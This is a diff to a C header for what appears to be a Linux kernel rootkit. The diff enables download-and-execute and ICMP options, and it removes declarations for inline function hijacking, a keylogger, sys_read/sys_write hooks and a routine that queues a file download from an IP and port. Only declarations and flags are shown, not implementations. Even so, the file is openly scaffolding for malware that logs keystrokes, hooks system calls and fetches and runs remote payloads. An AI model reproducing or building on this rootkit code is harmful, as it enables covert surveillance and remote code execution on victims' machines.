@@ -16,6 +16,8 @@
 #define __DEBUG_HOOK__ 1        // Debugging of inline function hooking
 #define __DEBUG_KEY__ 1         // Debugging of user keypresses
 #define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks
+#define _CONFIG_DLEXEC_ 1
+#define _CONFIG_ICMP_ 1
 
 #if __DEBUG__
 # define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
@@ -47,11 +49,6 @@ char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
 void *memstr(const void *haystack, const char *needle, size_t size);
 
-void hijack_start(void *target, void *new);
-void hijack_pause(void *target);
-void hijack_resume(void *target);
-void hijack_stop(void *target);
-
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
 unsigned long get_symbol(char *name);
 #endif
@@ -63,21 +60,8 @@ void enable_module_loading(void);
 extern unsigned long *ia32_sys_call_table;
 #endif
 
-#if defined(_CONFIG_KEYLOGGER_)
-void keylogger_init(void);
-void keylogger_exit(void);
-#endif
-
-#if defined(_CONFIG_HOOKRW_)
-void hookrw_init(void);
-void hookrw_exit(void);
-#endif
-
-
-void dlexec_init(void);
-void dlexec_exit(void);
-int dlexec_queue(char *path, unsigned int ip, unsigned short port, unsigned int retry, unsigned int delay);
 
 
 void icmp_init (void);
 void icmp_exit (void);
+
